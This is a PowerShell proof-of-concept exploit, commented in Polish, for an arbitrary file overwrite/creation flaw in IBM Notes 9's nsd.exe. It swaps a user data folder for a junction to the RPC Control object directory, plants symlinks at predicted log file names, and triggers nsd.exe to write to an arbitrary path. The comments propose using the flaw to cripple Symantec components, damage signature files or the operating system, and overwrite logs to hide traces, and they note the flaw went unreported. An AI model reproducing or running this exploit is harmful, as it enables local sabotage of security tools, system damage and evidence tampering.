#powershell -NoP -ExecutionPolicy UnRestricted -file "C:\Users\[redacted]\Desktop\IBM-Local DoS EoP\MakeRedirection.ps1"

######################
#
# IBM Notes 9 (9.01.14050)
# C:\Program Files (x86)\IBM\Notes\nsd.exe Lazy POC Exploit
# Arbitrary File Overwrite / Creation 
#
# Nazwa produktu IBM wnsd
# Wersja pliku: 9.0.10.13287 
# Wersja produktu: 9.0.10.3261
# 
# Tested on: Microsoft Windows 10 Enterprise, Windows 11 Home 
#            10.0.19044 N/A Build 19044
#
# --------------------
# 
# Nie mamy pe�nej kontroli nad danymi, kt�re s� zapisywane do pliku. 
# Pr�bowa�em u�y� alias�w polece�, ale wygl�da na to �e nie posiadaj�c odpowiednich uprawnie�
# nie ma mo�liwo�ci zdefiniowania alias�w, jest jeszcze opcja z nadu�yciem zmiennych �rodowiskowych i kolejno�ci przeszukiwania folder�w,
# ale tylko przy spe�nieniu dodatkowych warunk�w.
# B��d mo�e zosta� wykorzystany do nadpisywania plik�w np. mo�emy postara� si� nadpisa� pliki system�w detekcji 
# np. symanteka tak aby si� wi�cej nie uruchomi� lub uruchomi� sie upo�ledzony (sysfer.dll to �wietny kandydat), 
# mo�emy te� pr�bowa� nadpisywa� pliki sygnatur lub poprostu uszkodzi� 
# system operacyjny lub wybran� aplikacje. Oczywi�cie mo�emy te� nadpisywa� logi w celu zacierania �lad�w.
# 
# Nie wiem czy b��d wyst�puje w wersjach p�niejszych ni� 9.0.10.13.287, nie wiem r�wnie� czy IBM (HCL) o nim wie, 
# mia�em w planach poinformowa� dostawc�, ale za du�o kont trzeba za�o�y� i w og�le tak mi si� jako� odechcia�o.
#
# --------------------
# TODO:  Ewentualne zg�oszenie do IBM lub HCL (trudno orzec)
#
# ////////////////////
#
######################


$N = 59;

$user_name = $env:UserName;

$target_path = "C:\Users\"+$user_name+"\AppData\Local\IBM\Notes\Data\"; 

if (!(Test-Path -Path $target_path)) { 
    Write-output "Directory "$target_path" not exists!";
    Exit;
}
  
$target_path = $target_path + "IBM_TECHNICAL_SUPPORT"; 

if(Test-Path -Path $target_path ) {

   if( (Get-Item $target_path).LinkType -eq "Junction") {

        Remove-Item -Force $target_path;

   }
   else {
         Rename-Item $target_path "IBM_TECHNICAL_SUPPORT - old";
   }

} else {
  Write-output "Directory "$target_path" not exists!";
  Exit;
}

$tools_path = (Get-Location).Path;

&$tools_path'\createMountPoint.exe' $target_path '"\RPC Control"' #...


#FORMAT NAZWY PLIKU 
#
#nsd_W32I_XXX-6666_2022_10_24@10_19_27
#
#nsd_ <- sta�e
#W32I_ <- znane
#XXX-6666_ <- nazwa komputera
#2022_10_24@10_19_27 <- data w formacie YYYY-MM-DD@HH_MM_SS

$computer_name = $env:COMPUTERNAME;

$log_file_name = "nsd_W32I_"+$computer_name+"_"

Write-OutPut $log_file_name;


for( $i=0; $i -lt 3; $i++) { 

    for( $j=0; $j -lt $N; $j++) {

         $time = (Get-Date).AddMinutes($i).AddSeconds($j).toString("yyyy_MM_dd@HH_mm_ss");

         $rpc_file_name = $log_file_name + $time +".log";

         Write-output $rpc_file_name;

         $args = '"\RPC Control\'+$rpc_file_name+'" "\??\C:\ECHO_POWNED_VIA_IBM_1337.log.dll.bat"';

         Start-Process -NoNewWindow -FilePath $tools_path'\createNativeSymLink.exe' -ArgumentList $args;

    } 

}

Start-Process -Wait -FilePath "C:\Program Files (x86)\IBM\Notes\nsd.exe" -ArgumentList "-hang";

Start-Process -FilePath "C:\WINDOWS\System32\taskkill.exe" -ArgumentList "/F /IM CreateNativeSymLink.exe";
